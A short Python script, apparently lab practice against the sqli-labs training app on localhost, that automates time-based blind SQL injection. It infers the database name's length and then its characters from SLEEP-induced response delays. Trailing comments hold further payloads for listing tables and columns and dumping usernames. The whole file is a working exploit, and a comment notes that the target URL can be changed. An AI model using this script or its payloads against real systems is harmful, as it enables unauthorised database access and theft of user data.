import time
import requests
def database_lent():
	for i in range(1,1000):
		url = '''http://127.0.0.1/sqli-labs-master/Less-9/index.php'''
		timepass=time.time()
		payload = '''?id=1' and  if (length((select database())) >%d,null,sleep(3))''' %i
		# print(url+payload+'%23')
		r = requests.get(url+payload+'%23')
		timenow=time.time()
		if timenow-timepass<2:
			print(i)
		else:
			#print('false')
			fp=open('a.html','w+')
			fp.write(r.text)
			print('database_length:',i)
			return i
			break

len1=database_lent()   
 
def database_namet(len1):
	z="sqcwertyuioplkjhgfdazxvbnm"
	print( len(z))
	name = ''
	for j in range(1,len1+1):#字符串匹配的长度范围
		for i in range(32,128):#字符串匹配的范围
			timepass=time.time()
			url = "http://127.0.0.1/sqli-labs-master/Less-9/index.php?id=1' and if(substr((select database()),%d,1)='%s',sleep(2),null)" %(j,chr(i))
			# print(url+'%23')
			r = requests.get(url+'%23')
			timenow=time.time()
			if  timenow-timepass>1.5:
				name = name+chr(i)
				
				print(name)

				break
	print('database_name:',name.lower())
database_namet(len1)
 #url可以改
 #(select database())
 #select group_concat(table_name) from information_schema.tables where table_schema='security'
 #(select group_concat(column_name) from information_schema.columns where table_name='users') 
 #(select group_concat(username) from security.users)
 #
